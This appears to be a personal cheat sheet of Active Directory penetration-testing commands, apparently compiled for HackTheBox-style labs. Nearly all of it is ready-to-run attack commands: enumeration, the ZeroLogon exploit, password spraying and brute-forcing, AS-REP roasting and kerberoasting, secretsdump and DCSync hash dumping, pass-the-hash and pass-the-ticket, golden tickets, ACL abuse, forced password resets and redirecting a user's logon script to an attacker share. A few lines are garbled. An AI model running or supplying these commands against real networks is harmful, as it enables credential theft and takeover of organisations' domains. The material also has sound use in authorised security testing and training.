## AD Checklist - Remote Enumeration

Got so sick of running all other the place for commands and variation of them. Run through all of the relevant ports' mds. All windows os privilege escalation and local enumeration is is windows-enumeration.md.

sprayhound

```bash
nxc smb 192.168.32.0/24
source /opt/setenv.sh ip domain dc # user pass

# Sync Computer Time
sudo ntpdate -u $ip && date # (host) sudo service vboxadd-service stop -> sudo rdate -n $dcip, timedatectl set-ntp 0 (for troubleshooting)
nmap -sV -sC $ip # Detect clock skew automatically
nmap -sT $ip -p445 --script smb2-time -vv # Compute yourself the difference between the clocks
sudo date -s "14 APR 2015 18:25:16" # Linux
net time /domain /set # Windows
faketime -f '+8h' date

/opt/nmap.sh -H $ip -t All
mkdir nmap; sudo nmap -s -p- 192.168.32.0/24 -oA nmap/sweep.nmap -T4
/opt/nmap.sh 192.168.32.10-12
nmap -Pn -p- -sC -sV -oA full_scan 192.168.32.10-12

nslookup -type=srv _ldap._tcp.dc._msdcs.$dom $ip

python /opt/evil-winrm-krb-configurator.py $dom DC01

sudo autorecon $ip --subdomain-enum.domain $dom --global.domain $dom

enum4linux -a $ip
enum4linux -a -M -l -d $ip 2>&1
enum4linux -a -u "$dom\\$user" -p $pass $ip
enum4linux -a -u "$dom\\$user" -p "" -M -l -d $ip 2>&1
enum4linux -a -u "" -p "" $ip && enum4linux -a -u "guest" -p "" $ip
enum4linux -a -M -l -d $dom 2>&1 && enum4linux-ng $dom -A -C
enum4linux -a -M -l -u "" -p "" $ip && enum4linux -a -u "guest" -p "" $ip
enum4linux -a -u "$dom\\$user" -M -l -d $dom 2>&1 && enum4linux-ng $dom -u $user -p $pass -A -C

enum4linux-ng $ip
enum4linux-ng $ip -A -C
enum4linux-ng $ip -u $user -p $pass -oY out

# Find user list
enum4linux -U $dcip | grep 'user:'
nxc smb $ip auth_method --users | awk '{print $5}' | tr -s -c ' ' >> users.txt

# ZeroLogon
python /opt/cve-2020-1472-exploit.py $bios $ip
nxc smb $ip auth_method -M zerologon

smbclient -L //$ip
smbclient -N -L //$ip
smbclient -L //$ip -N

nxc smb $ip -u 'a' -p '' --shares
nxc smb $ip -u 'a' -p '' --all
nxc smb $ip -u 'guest' -p '' --shares
nxc smb $ip -u 'administrator' -p 'fake' --shares
nxc smb $ip -u '' -p 'fake' --shares
nxc smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success
nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute # If IPC$ is readable
nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute > u.txt

smbmap -u "" -p "" -P 445 -H $ip && smbmap -u "guest" -p "" -P 445 -H $ip
smbclient -U '%' -L //$dcip && smbclient -U 'guest%' -L //$dcip # $dcip
smbclient —kerberos //$dc/share
smbclient.py -k @braavos.essos.local
smbclient.py -k -no-pass @winterfell.north.sevenkingdoms.local
python /opt/ntlm_theft/ntlm_theft.py -g all -s $myip -f test # Create a bunch of clickable links to get ntlm when you can put in shared

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='$dom',userdb=users.txt" $dcip # Kerberos users
nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$dom',userdb=$WORDLIST" $dcip # Pre-auth bruteforce
getTGT.py $dom/$user:$pass # -dc-ip $dc
getTGT.py $dom/Administrator -dc-ip $dc -hashes aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051
KRB5CCNAME=/home/kali/htb/absolute/d.klay.ccache nxc smb $ip -u $user -p $pass -k

nxc smb $ip -d $dom -u 'a' -p '' -M enum_dns
adidnsdump -u $dom\\$user -p $pass winterfell.north.sevenkingdoms.local

rpcclient -U $user $ip 
rpcclient $ip -N -U ""
rpcclient -U "$dom\\" $ip -N

python /opt/ridenum.py $ip 500 2000
samrdump.py $dom/$user:$pass@$ip

# Check if password policy was manually made easier, hidden passwords
ldapsearch -x -h $ip -s base # null bind connection
ldapsearch -x -H ldap://$ip
ldapsearch -x -H ldap://$ip -s base namingcontexts
ldapsearch -x -H ldap://$ip -b "DC=,DC="
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)'
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' sAMAccountName sAMAccountType
ldapsearch -x -H ldap://$ip -b "DC=DomainDnsZones,DC=,DC="
ldapsearch -H ldap://$ip -D "$user@$dom" -w "$pass" -b 'dc=,dc='
ldapsearch -x -H ldap://$ip -b "DC=,DC=" | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:"
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"
ldapsearch -LLL -x -H ldap://$ip -b'DC=absolute,DC=htb' -s base '(objectclass=\*)'

# Automates the above
/opt/ldappy.sh $ip -u $user -p $pass -d $dom

/opt/legba/legba ldap --target $ip:389 --username administrator --password custom-passwords.txt --ldap-domain $dom --single-match
ldapdomaindump $dom --no-json --no-html
ldapdomaindump $ip -u "$dom\\$user" -p $pass --no-json --no-grep [--authtype SIMPLE]
/opt/ldapper -D $dom -U $user -P $pass -S $ip -m 0  -s '(cn=*)' cn
python ldapper.py -D 'domain' -U 'user' -P 'pass' --server $dom --maxrecords 0 --search 1 | grep samaccountname | awk -F':' '{print $2}' > usernames.txt
bloodhound-python -d $dom -v --zip -c All -dc $ip -ns $ip
bloodhound-python -u $user -p $pass -d $dom -v --zip -c All -dc $dc -ns $ip
bloodhound-python -u $user -p $pass -k -d $dom -dc $dc -c ALL --zip
bloodhound-python -u $user -p $pass -k -d $dom -dc $dc -c ALL -ns $ip --zip
ldeep cache -d "$dom" -p "$dom" trusts
ldeep ldap -u $user -p $pass -d $dom -s ldap://$dom add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM" # Then try evil-winrm

# If you attempt to authenticate to an AD server via Kerberos, it's going to say 'hey, continue with pre-authentication'. It doesn't do that with invalid names. Kerbrute is only kerberos users.
/opt/kerbrute userenum usernames.txt -d "$dom" --dc $ip
/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames-dup-lowercase.txt -t 100
/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -t 100
/opt/kerbrute userenum -d $dom --dc $ip custom-wordlist.txt -t 100
cewl -g --with-numbers -d 20 $url |grep -v CeWL > custom-wordlist.txt
hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule custom-wordlist.txt >> custom-passwords.txt
awk 'NR==FNR {a[$1]; next} {for (i in a) print $1 ":" i}' custom-passwords.txt users.txt > combined.txt
/opt/kerbrute bruteuser -d $dom custom-passwords.txt administrator --dc $ip
for i in $(cat users.txt); do echo "$i:$i" >> combo.txt; done
/opt/kerbrute bruteforce combo.txt -d $dom --dc $ip
/opt/kerbrute passwordspray -d $dom --dc $ip users.txt $pass

impacket-GetADUsers -dc-ip $ip "$dom/" -all
impacket-GetADUsers -dc-ip $ip $dom/$user:$pass -all

# Even if you don't have a password, use their username to auth
GetNPUsers.py -request -format hashcat -outputfile asrep.txt "$dom/$user"
for u in $(cat users.txt); do GetNPUsers.py -request -format hashcat -outputfile asrep.txt "$dom/$u"; wait; done
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip "$dom/"
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip $dom/$user:$pass
GetNPUsers.py $dom/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile hashes.txt
GetNPUsers.py htb.local/svc-alfresco -no-pass
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
nxc ldap 10.0.2.11 -u $user -p $pass --kdcHost 10.0.2.11 --asreproast output.txt

# CVE-2022-33679 ( If you can't crack ASREP hash )
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
user@hostname:~$ python CVE-2022-33679.py $dom/User DC01.$dom
user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
user@hostname:~$ netexec smb DC01.$dom -k --shares

# Kerberoasting
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom/"
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom"/"$user":"$pass"
nxc ldap 10.0.2.11 -u $user -p $pass --kdcHost 10.0.2.11 --kerberoast output.txt
Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" # powerview
Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt # Kerberoast (RC4 ticket)
Rubeus.exe kerberoast /tgtdeleg # Kerberoast (AES ticket), Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.
Rubeus.exe kerberoast /rc4opsec # Kerberoast (RC4 ticket), The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.

# Kerberoasting without domain account
# Prereqs: have a list of users, be able to query KDC
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.$dom" "$dom"/ 
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"$dom" /dc:"dc.$dom" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"

# Timeroasting
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt

/opt/windows/nxc.sh $ip

sudo cp /etc/krb5.conf /etc/krb5user.bak
python /opt/evil-winrm-krb-configurator.py $dom dc
export KRB5_CONFIG=/etc/krb5.conf
export KRB5CCNAME=/tmp/krb5cc_1000
kinit d.klay@ABSOLUTE.HTB
klist

impacket-mssqlclient $user:$pass@$ip -windows-auth
impacket-mssqlclient $dom/$user:$pass@$ip -windows-auth
nxc mssql -d $dom -u $user -p $pass -x "whoami" 192.168.165.40 -q 'SELECT name FROM master.dbo.sysdatabases;'
nxc mssql -d $dom -u $user -p $pass -x "whoami" 192.168.165.40 -q 'use hrappdb; select * from hrappdb..sysobjects;' --port 58538 -M mssql_priv

source /opt/targetedKerberoast/venv/bin/activate
python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip
python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip -o kerberload.txt
python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip
net group "domain admins" myuser /add /domain
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom"/"$user":"$pass"

python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k get writable --right WRITE --detail
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName' # Check for interesting permissions on accounts:
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass get object $user --attr servicePrincipalName # Check if current user has already an SPN setted:
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set object servicePrincipalName $target -v 'ops/whatever1' # Force set the SPN on the account: Targeted Kerberoasting
impacket-GetUserSPNs -dc-ip $ip "$dom/$user:$pass" -request-user "target" # Grab the ticket
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set object $user servicePrincipalName # Grab the ticket
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set password 'iain.white' "$pass" # GenericAll or GenericWrite

# If you own a Group, you can add your own attributes, such as AddMember privilege. Ensure that you are a part of that group at some point as this isnt always the case.
owneredit.py "$dom"/"$user":"$pass" -k -action write -new-owner "$user" -target-dn 'DC=ABSOLUTE,DC=HTB' -target "NETWORK AUDIT" -dc-ip $ip # writeowner on group trust abuse, genie granting himself unlimited wishes
dacledit.py "$dom"/"$user":"$pass" -k -action write -target-dn 'DC=ABSOLUTE,DC=HTB' -dc-ip $ip  -principal "$user"-dc-ip $ip # grant ability to write new members, anything with group
dacledit.py "$dom"/"$user":"$pass" -k -action write -target-dn 'DC=ABSOLUTE,DC=HTB' -dc-ip $ip  -principal "$user"-dc-ip $ip # verify
python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k add groupMember "S-1-5-21-4078382237-1492182817-2568127209-1119" "S-1-5-21-4078382237-1492182817-2568127209-1116" # add 1116 to 1119
python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k get object "S-1-5-21-4078382237-1492182817-2568127209-1116" # verify 
net rpc group addmem "Network Audit" $user -U $dom/$user:$pass -S $dc
net rpc group members "Network Audit" -U $user -k -S $dc # verify
getTGT.py $dom/$user:$pass # -dc-ip $dc
export KRB5CCNAME=$user.ccache
python pywhisker.py -d $dom -u $user -k  -t "winrm_user" --action "add"  --dc-ip $ip
python /opt/PKINITtools/gettgtpkinit.py $dom/winrm_user -cert-pfx XprBXoPu.pfx -pfx-pass SYBO85IL98n9g0vAfoWm winrm.ccache
export KRB5CCNAME=winrm.ccache
evil-winrm -i $dc -r $dom
evil-winrm -i $ip -u $user -H $hash -s /opt/windows -e /opt/windows

net rpc password $target $pass -U "$dom"/"$user"%"$pass" -S "$dc"

certipy-ad find -username $user@$dom -k -target $dc
certipy shadow auto -k -no-pass -u $dom/$user@$dc -dc-ip $ip -target $dc -account winrm_user
KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.$dom -r absolute.ht


KRB5CCNAME=/home/kali/htb/absolute/svc_smb.ccache nxc ldap -u $user -p $pass -k -M adcs $dc
ldapsearch -H ldap://dc.$dom -b "dc=absolute,dc=htb"


# Grab Hash (capturing, dumping lsa, dcsync, ..)
python3 dementor.py -u $user -p $pass -d $dom --dc-ip 10.10.10.1
python3 targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip 10.10.10.1
python3 PetitPotam.py -d $dom -u $user -p $pass 10.10.10.2 10.10.10.1
python3 secretsdump.py $dom/$user:$pass@10.10.10.1
python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip $ip $dom/$user:$pass@10.10.10.2

# Pass the hash
psexec.py -hashes ":$hash" $user@$ip
atexec.py -hashes ":$hash" $user@$ip "command"
wmiexec.py -hashes ":$hash" $user@$ip
evil-winrm -i $ip/$dom -u $user -H $hash
xfreerdp /u:$user /d:$dom /pth:$hash /v:$ip
pth-wmic -U $dom/Administrator%16:16 //$ip "select Name from Win32_UserAccount"
pth-smbclient -U "$dom/ADMINISTRATOR%16:16" //192.168.10.100/Share
smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W $dom
smbclient.py -hashes 00000000000000000000000000000000:16 $dom/Administrator@$ip
nxc smb 10.2.0.2/24 -u $user -H ":489a04c09a5debbc9b975356693e179d" -x "whoami"
nxc mssql 10.2.0.2/24 -u $user -H ":489a04c09a5debbc9b975356693e179d" -x "whoami"
nxc winrm -u 'pete' -H <ntlm hash> --local-auth -x whoami
nxc smb $ip -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C # Do above if you get error saying “Account Restrictions are preventing ..”
nxc wmi 10.2.0.2/24 -u $user -H ":16" -x "whoami"
nxc smb 10.2.0.2/24 -u $user -H ":16" -x "whoami"
secretsdump.py ituser@10.0.0.40 -hashes $lm:$hash
# Add users to group, targeted kerberoast
getTGT.py $dom/$user -dc-ip $ip -hashes :$hash
getST.py -hashes :$hash -spn www/server01.$dom -dc-ip $ip -impersonate Administrator $dom/$user
ticketer.py -nthash $hash -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain $dom -dc-ip $ip -spn cifs/$dom john
python3 ticketer.py -nthash $hash -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain $dom -dc-ip $ip john
rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip $ip -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA $dom/$user
rbcd.py -u PC01$ -H LM:NT -t 'CN=PC02,CN=Computers,DC=domain,DC=local' -d $dom -c 'CN=PC01,CN=Computers,DC=domain,DC=local'  -l DC1.$dom
getST.py -spn cifs/PC02 -hashes aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248 -impersonate DA $dom/PC01\$ # If works, use secretsdump -k to dump 02
rpcdump.py -hashes 16:16 $dom/Administrator@$ip
pth-rpcclient -U $dom/Administrator%16:16 //$ip
pth-net rpc share list -U "ignite\Administrator%16:16" -S $ip
pth-winexe -U Administrator%16:16 //$ip cmd.exe
pth-curl --ntlm -u Administrator:32 http://$ip/file.txt
python lookupsid.py -hashes 16:16 $dom/Administrator@$ip
python samrdump.py -hashes 16:16 $dom/Administrator@$ip
python reg.py -hashes 16:16 $dom/Administrator@$ip query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
python3 smbpasswd.py $dom/administrator@$dom -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :<ESTEBAN_DA NT HASH>
kerberos::golden /user:raaz /domain:ignite.local /sid:S-1-5-21-1255168540-3690278322-1592948969 /krbtgt:5cced0cb593612f08cf4a0b4f0bcb017 /id:500 /ptt
bloodyAD --host $dc -d $dom -u $user -p :$hash set password $user $pass # Using bloodyAD with pass-the-hash to change password, GenericAll/GenericWrite/Owns - User
bloodyAD.py --host $dcip -d $dom -u attacker_user -p :$hash add dcsync user2 # Give DCSync right to the principal identity, WriteDACL - Domain


# Get the Ticket / Cache
python3 gettgtpkinit.py $dom/DC01\$ -cert-pfx crt.pfx -pfx-pass $pass out.ccache
mimikatz "kerberos::list /export" # List and export all the tickets
mimikatz "kerberos::ask /target:cifs/dc1.ignite.local" # When will this work ?
mimikatz "kerberos::tgt" # List TGTs
mimikatz "kerberos::clist Administrator.cache" # List all ccache files on system
getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET # with an NT hash (overpass-the-hash)
getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET # with an AES (128 or 256 bits) key (pass-the-key)

# Pass the Ticket / Pass the Cache (inherit rights of service, tgt->tgs, get nt hash, silver ticket, golden ticket, sapphire ticket, rodc golden ticket, ms14-068)
# Must inject first
Rubeus.exe ptt /ticket:"base64 | file.kirbi"
kerberos::ptt $ticket_kirbi_files
kerberos::ptt $ticket_ccache_file
export KRB5CCNAME="$(pwd)"/ticket.ccache
ssh -o GSSAPIAuthentication=yes user@$dom -vv
secretsdump.py -k PC02.$dom
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.$dom -r $dom
psexec.py -dc-ip $ip -target-ip $ip -no-pass -k ignite.local/yashika@WIN-S0V7KMTVLD2.ignite.local
KRB5CCNAME=out.ccache python3 getnthash.py $dom/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773 # gettgtpkinit is pre-req
mimikatz "kerberos::ptt ticket.kirbi misc::cmd" # whoami will return your name pre-ptt, must test by access or executing something you couldn't before
mimikatz "kerberos::ptc ticket.ccache misc::cmd"
mimikatz "kerberos::ptt ticket.ccache misc::cmd"
get4uticket.py # In TGT, Out TGS
secretsdump.py -k $dc
netexec smb $TARGETS -k --sam
netexec smb $TARGETS -k --lsa
netexecETS -k --ntds
netexec smb $TARGETS -k -M lsassy
netexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
lsassy -k $TARGETS
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
psexec.py -k 'DOMAIN/USER@TARGET'
smbexec.py -k 'DOMAIN/USER@TARGET'
wmiexec.py -k 'DOMAIN/USER@TARGET'
atexec.py -k 'DOMAIN/USER@TARGET'
dcomexec.py -k 'DOMAIN/USER@TARGET'
netexec winrm $TARGETS -k -x whoami
netexec smb $TARGETS -k -x whoami
.\PsExec.exe -accepteula \\$TARGET cmd

# Pass the Certificate
python3 gettgtpkinit.py $dom/DC01\$ -cert-pfx crt.pfx -pfx-pass $pass out.ccache 
KRB5CCNAME=out.ccache python3 getnthash.py $dom/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE" # Base64-encoded PFX certificate (string) (password can be set)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE" # PEM certificate (file) + PEM private key (file)
certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx" # Certipy doesn't support PFXs w passwords, this should help
openssl pkcs12 -in file.pfx -out pub.pem -nokeys
openssl pkcs12 -in file.pfx -out priv.pem # Enter passwd and verify
certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt" # extract key and cert from the pfx
certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"
passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "$dom" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate # elevate a user for DCSYNC with passthecert.py
evil-winrm -i $ip -P 5986 -c pub.pem -k priv.pem -S -r $dom
getS4Uproxy.py
getS4Uself.py
getS4Uproxy.py

# Overpass the Hash / Pass the Key (PTK)
Rubeus ptt /ticket:<ticket>
Rubeus asktgt /user:victim /rc4:<rc4value>
Rubeus.exe asktgt /domain:igntie.local /user:Administrator /rc4:32196b56ffe6f45e294117b91a83bf38 /ptt
Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]
Rubeus ptt /luid:0xdeadbeef /ticket:<ticket>
mimikatz "privilege::debug sekurlsa::pth /user:Administrator /domain:ignite.local /aes256:9c83452b5dcdca4b0bae7e89407c700bed3153c31dca06a8d7be29d98e13764c"
mimikatz "privilege::debug sekurlsa::pth /user:Administrator /domain:ignite.local /aes128:b5c9a38d8629e87f5da0a0ff2c67f84c"
mimikatz "privilege::debug sekurlsa::pth /user:Administrator /domain:igntie.local /ntlm:a29f7623fd11550def0192de9246f46b /aes128:b5c9a38d8629e87f5da0a0ff2c67f84c /aes256:9c83452b5dcdca4b0bae7e89407c700bed3153c31dca06a8d7be29d98e13764c"
mimikatz "privilege::debug sekurlsa::pth /user:Administrator /domain:igntie.local /ntlm:a29f7623fd11550def0192de9246f46b"
getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET # with an AES (128 or 256 bits) key (pass-the-key)

--- 

# Adalanche
adalanche collect activedirectory --domain $dom --username $user --password $pass
adalanche collect activedirectory --domain $dom --username $user --password $pass --server $ip
adalanche -domain $dom -username $user -password $pass dump
adalanche -domain contoso.local analyze
adalanche -domain $dom analyze
---

# Generic All (set yourself as owner and grant fullcontrol, targeted kerberoast, reset password, targeted asreproast)
python3 owneredit.py -k -no-pass $dom/$user -dc-ip dc.$dom -new-owner $user -target 'Network Audit' -action write
dacledit.py -k -no-pass $dom/$user -dc-ip dc.$dom -principal $user -target "Network Audit" -action write -rights FullControl
rm /tmp/krb5cc_0
kinit $user
net rpc group addmem "Network Audit" $user -U '$user' --use-kerberos=required -S dc.$dom
net rpc group members "Network Audit" -U '$user' --use-kerberos=required -S dc.$dom # Verify
net rpc group addmem "Network Audit" $user -U '$user' -k -S dc.$dom
net rpc group members "Network Audit" -U '$user' -k -S dc.$dom
certipy-ad find -username $user@$dom -k -target dc.$dom
getTGT.py $dom/$user:$pass -dc-ip dc.$dom
export KRB5CCNAME="$(pwd)/$user.ccache"
certipy-ad shadow auto -k -no-pass -u $dom/$user@dc.$dom -dc-ip $dcip -target dc.$dom -account winrm_user
export KRB5CCNAME="$(pwd)/winrm_user.ccache" # Or specify before command
SPN-Jacking.py # If the "listed SPN" already belongs to an object, it must be removed from it first. This would require the same privileges (GenericAll, GenericWrite, etc.) over the SPN owner as well (a.k.a. "Live SPN-jacking"). Else, the SPN can be simply be added to the target object (a.k.a. "Ghost SPN-jacking").


# Generic All / Generic Write / Owns - User (targeted kerberoast, reset password, targeted asreproast, alter script path)
python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k get writable --right WRITE --detail
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner') }
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
# Change their Password
net user $user $pass /domain
# Change their password
$user = 'DOMAIN\user1'; 
$pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
$newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
# Targeted Kerberoast
Set-DomainObject -Credential $creds -Identity $user -Set @{serviceprincipalname="fake/NOTHING"}
Set-DomainObject -Identity $user -Set @{serviceprincipalname='any/thing'} # Alt
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity $user -Clear serviceprincipalname -Verbose
Set-DomainObject -Identity username -Clear serviceprincipalname # Remove the SPN
# Targeted ASREPRoast (Disable pre-authentication for the user)
Get-DomainUser username | ConvertFrom-UACValue
Set-DomainObject -Identity $user -XOR @{UserAccountControl=4194304} -Verbose
# Targeted Kerberoasting
bloodyAD --host $ip -d $dom -u $user -p $pass get object $user --attr serviceprincipalname # Check if current user has already an SPN setted:
bloodyAD --host $ip -d $dom -u $user -p $pass set object $user serviceprincipalname -v 'ops/whatever1'
GetUsersSPNs.py -dc-ip $ip $dom/$user:$pass -request-user $user # Grab the ticket
bloodyAD --host $ip -d $dom -u $user -p $pass set object $user serviceprincipalname # Remove the SPN
# Targeted ASREP Roasting
bloodyAD --host $dcip -d $dom -u $user -p $pass add uac $targetuser -f DONT_REQ_PREAUTH # Modify the userAccountControl
GetNPUsers.py DOMAIN/target_user -format <[hashcat|john]> -outputfile <file> # Grab the ticket
bloodyAD --host $dcip -d $dom -u $user -p $pass remove uac $targetuser -f DONT_REQ_PREAUTH # Set back the userAccountControl
# Change their password
bloodyAD --host $ip -d $dom -u $user -p :$hash set password $user $pass # Using bloodyAD with pass-the-hash
bloodyAD --host $ip -d $dom -u $user -p $pass set password $target_user $pass
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set password Molly.Smith $pass
# Change their password
rpcclient -U "$user%$pass" -W $dom -c "setuserinfo2 target_user 23 target_newpwd"
# Change script path
bloodyAD --host 10.0.0.5 -d $dom -u attacker -p $pass set object delegate scriptpath -v '\\10.0.0.5\totallyLegitScript.bat'
# Change script path
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.bat"

# WriteProperty - Script-Path
